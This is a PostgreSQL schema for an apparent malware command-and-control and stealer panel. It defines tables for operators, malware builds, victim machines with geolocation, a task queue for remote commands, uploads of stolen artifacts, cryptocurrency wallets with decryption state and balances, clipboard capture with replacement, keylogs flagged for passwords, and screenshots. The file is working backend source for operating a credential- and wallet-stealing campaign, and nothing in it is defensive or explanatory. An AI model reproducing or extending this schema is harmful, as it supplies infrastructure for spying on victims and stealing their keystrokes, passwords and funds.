CREATE EXTENSION IF NOT EXISTS pgcrypto;

CREATE TYPE "Role" AS ENUM ('admin', 'operator', 'viewer');
CREATE TYPE "VictimStatus" AS ENUM ('online', 'stale', 'offline', 'revoked');
CREATE TYPE "Profile" AS ENUM ('lite', 'full');
CREATE TYPE "TaskStatus" AS ENUM ('queued', 'running', 'done', 'error', 'cancelled', 'expired');
CREATE TYPE "ArtifactStatus" AS ENUM ('uploading', 'queued', 'processing', 'ready', 'failed');
CREATE TYPE "UploadState" AS ENUM ('open', 'committed', 'expired');
CREATE TYPE "WalletState" AS ENUM ('found', 'decrypted', 'locked', 'unsupported', 'corrupt');
CREATE TYPE "BuildStatus" AS ENUM ('draft', 'ready', 'revoked');

CREATE TABLE "Operator" (
  "id" UUID NOT NULL DEFAULT gen_random_uuid(),
  "email" TEXT NOT NULL,
  "passwordHash" TEXT NOT NULL,
  "totpSecret" TEXT NOT NULL,
  "totpEnabled" BOOLEAN NOT NULL DEFAULT false,
  "role" "Role" NOT NULL DEFAULT 'viewer',
  "disabled" BOOLEAN NOT NULL DEFAULT false,
  "failedAttempts" INTEGER NOT NULL DEFAULT 0,
  "lockedUntil" TIMESTAMP(3),
  "lastLoginAt" TIMESTAMP(3),
  "lastLoginIp" TEXT,
  "createdAt" TIMESTAMP(3) NOT NULL DEFAULT CURRENT_TIMESTAMP,
  CONSTRAINT "Operator_pkey" PRIMARY KEY ("id")
);
CREATE UNIQUE INDEX "Operator_email_key" ON "Operator"("email");
CREATE INDEX "Operator_role_idx" ON "Operator"("role");

CREATE TABLE "Session" (
  "id" UUID NOT NULL DEFAULT gen_random_uuid(),
  "operatorId" UUID NOT NULL,
  "tokenHash" TEXT NOT NULL,
  "ip" TEXT,
  "userAgent" TEXT,
  "expiresAt" TIMESTAMP(3) NOT NULL,
  "revokedAt" TIMESTAMP(3),
  "createdAt" TIMESTAMP(3) NOT NULL DEFAULT CURRENT_TIMESTAMP,
  CONSTRAINT "Session_pkey" PRIMARY KEY ("id")
);
CREATE UNIQUE INDEX "Session_tokenHash_key" ON "Session"("tokenHash");
CREATE INDEX "Session_operatorId_expiresAt_idx" ON "Session"("operatorId", "expiresAt");
ALTER TABLE "Session" ADD CONSTRAINT "Session_operatorId_fkey" FOREIGN KEY ("operatorId") REFERENCES "Operator"("id") ON DELETE CASCADE ON UPDATE CASCADE;

CREATE TABLE "Build" (
  "id" UUID NOT NULL DEFAULT gen_random_uuid(),
  "name" TEXT NOT NULL,
  "version" TEXT NOT NULL,
  "profile" "Profile" NOT NULL DEFAULT 'full',
  "buildId" UUID NOT NULL DEFAULT gen_random_uuid(),
  "tokenHash" TEXT NOT NULL,
  "secret" TEXT NOT NULL,
  "config" JSONB NOT NULL,
  "jarPath" TEXT,
  "status" "BuildStatus" NOT NULL DEFAULT 'draft',
  "createdById" UUID,
  "createdAt" TIMESTAMP(3) NOT NULL DEFAULT CURRENT_TIMESTAMP,
  "revokedAt" TIMESTAMP(3),
  CONSTRAINT "Build_pkey" PRIMARY KEY ("id")
);
CREATE UNIQUE INDEX "Build_buildId_key" ON "Build"("buildId");
CREATE UNIQUE INDEX "Build_tokenHash_key" ON "Build"("tokenHash");
CREATE INDEX "Build_status_createdAt_idx" ON "Build"("status", "createdAt");
ALTER TABLE "Build" ADD CONSTRAINT "Build_createdById_fkey" FOREIGN KEY ("createdById") REFERENCES "Operator"("id") ON DELETE SET NULL ON UPDATE CASCADE;

CREATE TABLE "Victim" (
  "id" UUID NOT NULL DEFAULT gen_random_uuid(),
  "buildId" UUID NOT NULL,
  "externalId" UUID NOT NULL DEFAULT gen_random_uuid(),
  "hostname" TEXT NOT NULL,
  "os" TEXT NOT NULL,
  "osVersion" TEXT NOT NULL DEFAULT '',
  "arch" TEXT NOT NULL DEFAULT 'x86_64',
  "username" TEXT NOT NULL,
  "ip" TEXT,
  "country" TEXT,
  "countryCode" TEXT,
  "city" TEXT,
  "lat" DOUBLE PRECISION,
  "lon" DOUBLE PRECISION,
  "tags" TEXT[] NOT NULL DEFAULT ARRAY[]::TEXT[],
  "status" "VictimStatus" NOT NULL DEFAULT 'online',
  "profile" "Profile" NOT NULL DEFAULT 'full',
  "agentVersion" TEXT NOT NULL DEFAULT '',
  "deviceTokenEnc" TEXT NOT NULL,
  "firstSeenAt" TIMESTAMP(3) NOT NULL DEFAULT CURRENT_TIMESTAMP,
  "lastHeartbeatAt" TIMESTAMP(3) NOT NULL DEFAULT CURRENT_TIMESTAMP,
  "revokedAt" TIMESTAMP(3),
  CONSTRAINT "Victim_pkey" PRIMARY KEY ("id")
);
CREATE UNIQUE INDEX "Victim_buildId_hostname_username_key" ON "Victim"("buildId", "hostname", "username");
CREATE INDEX "Victim_status_lastHeartbeatAt_idx" ON "Victim"("status", "lastHeartbeatAt");
CREATE INDEX "Victim_os_country_idx" ON "Victim"("os", "country");
ALTER TABLE "Victim" ADD CONSTRAINT "Victim_buildId_fkey" FOREIGN KEY ("buildId") REFERENCES "Build"("id") ON DELETE RESTRICT ON UPDATE CASCADE;

CREATE TABLE "SessionInfo" (
  "id" UUID NOT NULL DEFAULT gen_random_uuid(),
  "victimId" UUID NOT NULL,
  "kind" TEXT NOT NULL,
  "target" TEXT NOT NULL,
  "path" TEXT NOT NULL,
  "size" INTEGER NOT NULL DEFAULT 0,
  "updatedAt" TIMESTAMP(3) NOT NULL DEFAULT CURRENT_TIMESTAMP,
  CONSTRAINT "SessionInfo_pkey" PRIMARY KEY ("id")
);
CREATE UNIQUE INDEX "SessionInfo_victimId_kind_path_key" ON "SessionInfo"("victimId", "kind", "path");
ALTER TABLE "SessionInfo" ADD CONSTRAINT "SessionInfo_victimId_fkey" FOREIGN KEY ("victimId") REFERENCES "Victim"("id") ON DELETE CASCADE ON UPDATE CASCADE;

CREATE TABLE "Task" (
  "id" UUID NOT NULL DEFAULT gen_random_uuid(),
  "victimId" UUID NOT NULL,
  "name" TEXT NOT NULL,
  "params" JSONB NOT NULL DEFAULT '{}',
  "status" "TaskStatus" NOT NULL DEFAULT 'queued',
  "priority" INTEGER NOT NULL DEFAULT 0,
  "timeoutSec" INTEGER NOT NULL DEFAULT 120,
  "leaseUntil" TIMESTAMP(3),
  "attempts" INTEGER NOT NULL DEFAULT 0,
  "result" JSONB,
  "error" TEXT,
  "createdById" UUID,
  "createdAt" TIMESTAMP(3) NOT NULL DEFAULT CURRENT_TIMESTAMP,
  "notBefore" TIMESTAMP(3) NOT NULL DEFAULT CURRENT_TIMESTAMP,
  "finishedAt" TIMESTAMP(3),
  CONSTRAINT "Task_pkey" PRIMARY KEY ("id")
);
CREATE INDEX "Task_victimId_status_createdAt_idx" ON "Task"("victimId", "status", "createdAt");
CREATE INDEX "Task_status_notBefore_idx" ON "Task"("status", "notBefore");
ALTER TABLE "Task" ADD CONSTRAINT "Task_victimId_fkey" FOREIGN KEY ("victimId") REFERENCES "Victim"("id") ON DELETE CASCADE ON UPDATE CASCADE;
ALTER TABLE "Task" ADD CONSTRAINT "Task_createdById_fkey" FOREIGN KEY ("createdById") REFERENCES "Operator"("id") ON DELETE SET NULL ON UPDATE CASCADE;

CREATE TABLE "Upload" (
  "id" UUID NOT NULL DEFAULT gen_random_uuid(),
  "victimId" UUID NOT NULL,
  "taskId" UUID,
  "module" TEXT NOT NULL,
  "totalSize" INTEGER NOT NULL,
  "chunkCount" INTEGER NOT NULL,
  "sha256" TEXT NOT NULL,
  "received" INTEGER NOT NULL DEFAULT 0,
  "state" "UploadState" NOT NULL DEFAULT 'open',
  "path" TEXT NOT NULL,
  "expiresAt" TIMESTAMP(3) NOT NULL,
  "createdAt" TIMESTAMP(3) NOT NULL DEFAULT CURRENT_TIMESTAMP,
  CONSTRAINT "Upload_pkey" PRIMARY KEY ("id")
);
CREATE INDEX "Upload_victimId_state_expiresAt_idx" ON "Upload"("victimId", "state", "expiresAt");
ALTER TABLE "Upload" ADD CONSTRAINT "Upload_victimId_fkey" FOREIGN KEY ("victimId") REFERENCES "Victim"("id") ON DELETE CASCADE ON UPDATE CASCADE;

CREATE TABLE "Artifact" (
  "id" UUID NOT NULL DEFAULT gen_random_uuid(),
  "victimId" UUID NOT NULL,
  "uploadId" UUID NOT NULL,
  "taskId" UUID,
  "module" TEXT NOT NULL,
  "bytes" INTEGER NOT NULL,
  "sha256" TEXT NOT NULL,
  "containerPath" TEXT NOT NULL,
  "status" "ArtifactStatus" NOT NULL DEFAULT 'uploading',
  "manifest" JSONB,
  "error" TEXT,
  "createdAt" TIMESTAMP(3) NOT NULL DEFAULT CURRENT_TIMESTAMP,
  "processedAt" TIMESTAMP(3),
  CONSTRAINT "Artifact_pkey" PRIMARY KEY ("id")
);
CREATE UNIQUE INDEX "Artifact_uploadId_key" ON "Artifact"("uploadId");
CREATE INDEX "Artifact_victimId_module_createdAt_idx" ON "Artifact"("victimId", "module", "createdAt");
CREATE INDEX "Artifact_status_idx" ON "Artifact"("status");
ALTER TABLE "Artifact" ADD CONSTRAINT "Artifact_victimId_fkey" FOREIGN KEY ("victimId") REFERENCES "Victim"("id") ON DELETE CASCADE ON UPDATE CASCADE;
ALTER TABLE "Artifact" ADD CONSTRAINT "Artifact_uploadId_fkey" FOREIGN KEY ("uploadId") REFERENCES "Upload"("id") ON DELETE CASCADE ON UPDATE CASCADE;
ALTER TABLE "Artifact" ADD CONSTRAINT "Artifact_taskId_fkey" FOREIGN KEY ("taskId") REFERENCES "Task"("id") ON DELETE SET NULL ON UPDATE CASCADE;

CREATE TABLE "Wallet" (
  "id" UUID NOT NULL DEFAULT gen_random_uuid(),
  "victimId" UUID NOT NULL,
  "artifactId" UUID,
  "kind" TEXT NOT NULL,
  "targetId" TEXT NOT NULL,
  "path" TEXT NOT NULL,
  "state" "WalletState" NOT NULL DEFAULT 'found',
  "decryptState" TEXT NOT NULL DEFAULT 'none',
  "reason" TEXT,
  "address" TEXT,
  "balance" TEXT,
  "createdAt" TIMESTAMP(3) NOT NULL DEFAULT CURRENT_TIMESTAMP,
  CONSTRAINT "Wallet_pkey" PRIMARY KEY ("id")
);
CREATE UNIQUE INDEX "Wallet_victimId_path_key" ON "Wallet"("victimId", "path");
CREATE INDEX "Wallet_victimId_state_idx" ON "Wallet"("victimId", "state");
CREATE INDEX "Wallet_state_address_idx" ON "Wallet"("state", "address");
ALTER TABLE "Wallet" ADD CONSTRAINT "Wallet_victimId_fkey" FOREIGN KEY ("victimId") REFERENCES "Victim"("id") ON DELETE CASCADE ON UPDATE CASCADE;
ALTER TABLE "Wallet" ADD CONSTRAINT "Wallet_artifactId_fkey" FOREIGN KEY ("artifactId") REFERENCES "Artifact"("id") ON DELETE SET NULL ON UPDATE CASCADE;

CREATE TABLE "ClipboardEntry" (
  "id" UUID NOT NULL DEFAULT gen_random_uuid(),
  "victimId" UUID NOT NULL,
  "ts" TIMESTAMP(3) NOT NULL DEFAULT CURRENT_TIMESTAMP,
  "window" TEXT NOT NULL DEFAULT '',
  "process" TEXT NOT NULL DEFAULT '',
  "content" TEXT NOT NULL,
  "kind" TEXT NOT NULL DEFAULT 'text',
  "replaced" TEXT,
  CONSTRAINT "ClipboardEntry_pkey" PRIMARY KEY ("id")
);
CREATE INDEX "ClipboardEntry_victimId_ts_idx" ON "ClipboardEntry"("victimId", "ts");
ALTER TABLE "ClipboardEntry" ADD CONSTRAINT "ClipboardEntry_victimId_fkey" FOREIGN KEY ("victimId") REFERENCES "Victim"("id") ON DELETE CASCADE ON UPDATE CASCADE;

CREATE TABLE "Keylog" (
  "id" UUID NOT NULL DEFAULT gen_random_uuid(),
  "victimId" UUID NOT NULL,
  "ts" TIMESTAMP(3) NOT NULL DEFAULT CURRENT_TIMESTAMP,
  "process" TEXT NOT NULL DEFAULT '',
  "title" TEXT NOT NULL DEFAULT '',
  "text" TEXT NOT NULL,
  "password" BOOLEAN NOT NULL DEFAULT false,
  CONSTRAINT "Keylog_pkey" PRIMARY KEY ("id")
);
CREATE INDEX "Keylog_victimId_ts_idx" ON "Keylog"("victimId", "ts");
CREATE INDEX "Keylog_victimId_password_idx" ON "Keylog"("victimId", "password");
ALTER TABLE "Keylog" ADD CONSTRAINT "Keylog_victimId_fkey" FOREIGN KEY ("victimId") REFERENCES "Victim"("id") ON DELETE CASCADE ON UPDATE CASCADE;

CREATE TABLE "Screenshot" (
  "id" UUID NOT NULL DEFAULT gen_random_uuid(),
  "victimId" UUID NOT NULL,
  "artifactId" UUID NOT NULL,
  "ts" TIMESTAMP(3) NOT NULL DEFAULT CURRENT_TIMESTAMP,
  "width" INTEGER,
  "height" INTEGER,
  CONSTRAINT "Screenshot_pkey" PRIMARY KEY ("id")
);
CREATE INDEX "Screenshot_victimId_ts_idx" ON "Screenshot"("victimId", "ts");
ALTER TABLE "Screenshot" ADD CONSTRAINT "Screenshot_victimId_fkey" FOREIGN KEY ("victimId") REFERENCES "Victim"("id") ON DELETE CASCADE ON UPDATE CASCADE;
ALTER TABLE "Screenshot" ADD CONSTRAINT "Screenshot_artifactId_fkey" FOREIGN KEY ("artifactId") REFERENCES "Artifact"("id") ON DELETE CASCADE ON UPDATE CASCADE;

CREATE TABLE "Event" (
  "id" UUID NOT NULL DEFAULT gen_random_uuid(),
  "victimId" UUID NOT NULL,
  "kind" TEXT NOT NULL,
  "data" JSONB NOT NULL DEFAULT '{}',
  "createdAt" TIMESTAMP(3) NOT NULL DEFAULT CURRENT_TIMESTAMP,
  "readAt" TIMESTAMP(3),
  CONSTRAINT "Event_pkey" PRIMARY KEY ("id")
);
CREATE INDEX "Event_victimId_createdAt_idx" ON "Event"("victimId", "createdAt");
CREATE INDEX "Event_readAt_idx" ON "Event"("readAt");
ALTER TABLE "Event" ADD CONSTRAINT "Event_victimId_fkey" FOREIGN KEY ("victimId") REFERENCES "Victim"("id") ON DELETE CASCADE ON UPDATE CASCADE;

CREATE TABLE "Notification" (
  "id" UUID NOT NULL DEFAULT gen_random_uuid(),
  "kind" TEXT NOT NULL,
  "title" TEXT NOT NULL,
  "body" TEXT NOT NULL,
  "link" TEXT,
  "victimId" UUID,
  "operatorId" UUID,
  "readAt" TIMESTAMP(3),
  "createdAt" TIMESTAMP(3) NOT NULL DEFAULT CURRENT_TIMESTAMP,
  CONSTRAINT "Notification_pkey" PRIMARY KEY ("id")
);
CREATE INDEX "Notification_readAt_createdAt_idx" ON "Notification"("readAt", "createdAt");
ALTER TABLE "Notification" ADD CONSTRAINT "Notification_victimId_fkey" FOREIGN KEY ("victimId") REFERENCES "Victim"("id") ON DELETE CASCADE ON UPDATE CASCADE;
ALTER TABLE "Notification" ADD CONSTRAINT "Notification_operatorId_fkey" FOREIGN KEY ("operatorId") REFERENCES "Operator"("id") ON DELETE CASCADE ON UPDATE CASCADE;

CREATE TABLE "AuditLog" (
  "id" UUID NOT NULL DEFAULT gen_random_uuid(),
  "operatorId" UUID,
  "action" TEXT NOT NULL,
  "entity" TEXT NOT NULL,
  "entityId" TEXT,
  "ip" TEXT,
  "data" JSONB NOT NULL DEFAULT '{}',
  "createdAt" TIMESTAMP(3) NOT NULL DEFAULT CURRENT_TIMESTAMP,
  CONSTRAINT "AuditLog_pkey" PRIMARY KEY ("id")
);
CREATE INDEX "AuditLog_createdAt_idx" ON "AuditLog"("createdAt");
CREATE INDEX "AuditLog_operatorId_createdAt_idx" ON "AuditLog"("operatorId", "createdAt");
CREATE INDEX "AuditLog_entity_entityId_idx" ON "AuditLog"("entity", "entityId");
ALTER TABLE "AuditLog" ADD CONSTRAINT "AuditLog_operatorId_fkey" FOREIGN KEY ("operatorId") REFERENCES "Operator"("id") ON DELETE SET NULL ON UPDATE CASCADE;
